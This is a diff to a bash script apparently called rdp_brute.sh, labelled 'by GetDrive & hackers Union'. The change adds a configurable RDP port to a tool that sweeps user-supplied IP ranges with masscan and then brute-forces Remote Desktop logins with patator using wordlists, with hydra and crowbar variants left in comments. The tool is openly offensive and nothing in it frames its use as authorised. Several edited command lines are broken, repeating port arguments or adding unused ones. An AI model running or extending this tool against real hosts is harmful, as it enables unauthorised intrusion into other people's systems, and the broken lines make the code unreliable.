@@ -100,19 +100,23 @@ CHECKDEPEND
 cat /etc/apt/sources.list_lazybak>/etc/apt/sources.list
 rm -rf /etc/apt/sources.list_lazybak 2> /dev/null
 clear
+
                   
 echo -e       "$grey                     +-------------------------------------+"
 echo -e       "$grey                     |            Auto  Script             |"
 echo -e "$aquamarine                     |    by GetDrive & hackers Union      |" 
-echo -e        "$red                     |            Version 1.13             |"
+echo -e        "$red                     |            Version 1.14             |"
 echo -e        "$red                     +-------------------------------------+ $colorbase"
 #####################################CHECKLANGUAGE####################################
 CHECKLANGUAGE ()
 {
 lang=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1)
 if [ "$lang" = "ru" ];
-	then MENURU
+	then 
+read -p "                      Введите номер порта RDP {3389} : " port
+MENURU
 		else 
+read -p "                     Enter the port number RDP {3389} : " port
 	MENUENG
 fi
 }
@@ -361,7 +365,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
 echo "" 
-python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1  0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -393,7 +397,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
 #hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -422,7 +426,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=FILE2 port=FILE3 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -443,7 +447,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass 3=$port -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users  -C $PWD/dictionary/pass -S $PWD/open 
 #hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -498,7 +502,7 @@ echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=>$green "
 echo ""
-python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -528,7 +532,7 @@ echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=$passbrute 0=open3389 1=users -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -558,7 +562,7 @@ echo -e "                              $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -574,7 +578,7 @@ echo -e "                              $green Start bruteforceing "
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 port=$port password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users -C $PWD/dictionary/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; exit; ./rdp_brute.sh' 2
@@ -610,15 +614,17 @@ echo -e "   |$grey 5.$yellow Выход ($red[ENTER]$yellow) $colorbase         
 echo -e "   +-----------------------------------------------------------------------+"
 echo " "
 read -p "                                Выбор из меню : " menuoption
+
 if [ "$menuoption" = "1" ]; then
 echo -e "$red-------------------------------------------------------------------------------$aquamarine"
 read -p "Введите диапазон или одиночный IP {x.x.x.x/24,x.x.x.0-x.x.x.255} : " target
+
 echo -e "$red-------------------------------------------------------------------------------"
 clear
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 echo -e "$aquamarine                     Идет поиск открытых RDP. Ожидайте.$colorbase"
 echo -e "$red-------------------------------------------------------------------------------$green"
-masscan $target -p3389 --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan $target -p $port --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 CHECKFILERU
 
@@ -650,7 +656,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                     Идет поиск открытых RDP. Ожидайте.$colorbase"
 echo -e "$red-------------------------------------------------------------------------------$green"
 echo -e "$yellow*Для выхода из режима сканирования $red'CTRL+C'$green"
-masscan -p3389 -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 CHECKFILERU
 
@@ -698,8 +704,6 @@ echo -e "$red-------------------------------------------------------------------
 cat list
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 echo ""
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
-
 echo ""
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 echo -e "$aquamarine                    Проверяем на наличие открытых RDP портов. Ждите.."
@@ -710,7 +714,7 @@ echo -e "$yellow*Для выхода из режима сканирования$
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -741,7 +745,7 @@ echo -e "$red-------------------------------------------------------------------
 cat list
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 echo ""
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -756,7 +760,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -789,7 +793,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -804,7 +808,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -839,7 +843,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -854,7 +858,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -887,7 +891,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -902,7 +906,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -936,7 +940,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -951,7 +955,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -984,7 +988,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -999,7 +1003,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1032,7 +1036,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1047,7 +1051,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1079,7 +1083,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1094,7 +1098,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1127,7 +1131,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1142,7 +1146,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1175,7 +1179,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1190,7 +1194,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1223,7 +1227,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1238,7 +1242,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1272,7 +1276,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1287,7 +1291,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1321,7 +1325,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1336,7 +1340,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1370,7 +1374,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1385,7 +1389,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1419,7 +1423,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1434,7 +1438,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1468,7 +1472,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1483,7 +1487,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1517,7 +1521,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1532,7 +1536,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1566,7 +1570,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1581,7 +1585,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1615,7 +1619,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1630,7 +1634,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1664,7 +1668,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1679,7 +1683,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1712,7 +1716,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1727,7 +1731,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1760,7 +1764,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1775,7 +1779,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1808,7 +1812,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1823,7 +1827,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1857,7 +1861,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1872,7 +1876,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1905,7 +1909,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1920,7 +1924,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -1954,7 +1958,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -1969,7 +1973,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2003,7 +2007,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2018,7 +2022,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
